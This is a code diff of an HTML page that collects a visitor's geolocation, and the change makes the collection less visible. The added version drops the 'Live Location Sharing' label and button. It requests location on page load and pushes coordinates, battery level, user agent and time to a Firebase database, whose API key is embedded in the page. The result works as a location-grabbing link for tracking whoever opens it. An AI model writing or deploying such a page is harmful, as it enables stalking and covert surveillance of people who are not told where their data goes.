@@ -1,26 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>📍 Live Location Sharing</title>
-<style>
-body { font-family: Arial; text-align: center; padding-top:40px }
-button {
-  padding: 15px 25px; background:#007bff; color:#fff;
-  border:none; border-radius:10px; font-size:18px;
-}
-</style>
-</head>
-<body>
+<meta charset="UTF-8">
+<title>Location Permission</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<h2>📍 Live Location Sharing</h2>
-<p>Status: <span id="status">Waiting...</span></p>
-<button onclick="startTracking()">Start Live Tracking</button>
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
-import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
-
+<script>
+// Your Firebase Config
 const firebaseConfig = {
   apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
   authDomain: "signup-d32c5.firebaseapp.com",
@@ -32,43 +22,53 @@ const firebaseConfig = {
   databaseURL: "https://signup-d32c5-default-rtdb.firebaseio.com/"
 };
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-async function getBatteryLevel() {
-  try {
-    if (!navigator.getBattery) return null;
-    const b = await navigator.getBattery();
-    return Math.round(b.level * 100);
-  } catch { return null; }
+function requestLocation(){
+  if (!navigator.geolocation) {
+    alert("Your phone doesn't support geolocation!");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(success, error);
 }
 
-function startTracking(){
-  document.getElementById("status").innerHTML = "📡 Sending...";
+async function success(position){
+  let lat = position.coords.latitude;
+  let lon = position.coords.longitude;
 
-  setInterval(async () => {
-    navigator.geolocation.getCurrentPosition(async (pos) => {
+  // Battery Info
+  let battery = "Unknown";
+  try {
+    const bat = await navigator.getBattery();
+    battery = (bat.level * 100) + "%";
+  } catch {}
 
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      const battery = await getBatteryLevel() ?? "N/A";
+  // Device Info
+  let device = navigator.userAgent;
 
-      set(ref(db, "location"), {
-        lat, lng, battery,
-        device: navigator.userAgent,
-        time: new Date().toString()
-      });
+  // Save to Firebase
+  db.ref("location").push({
+    latitude: lat,
+    longitude: lon,
+    battery: battery,
+    device: device,
+    time: new Date().toLocaleString()
+  });
 
-      console.log("Location Sent ✅", lat, lng);
-      document.getElementById("status").innerHTML = "✅ Live Sending";
-    },
-    (err)=>{
-      console.log(err);
-      document.getElementById("status").innerHTML = "❌ Location Blocked!";
-      alert("Please allow location permission!");
-    });
-  }, 5000);
+  document.getElementById("status").innerHTML = 
+  "✅ Location Received & Saved <br> 📍 Lat: "+lat+" <br>📍 Lon: "+lon+"<br>🔋 Battery: "+battery;
+}
+
+function error(){
+  alert("❌ Location permission denied. Please allow GPS.");
 }
 </script>
+</head>
+
+<body onload="requestLocation()">
+<h2>📍 Waiting for Location Permission...</h2>
+<p id="status">Please Allow Location Access</p>
 </body>
 </html>
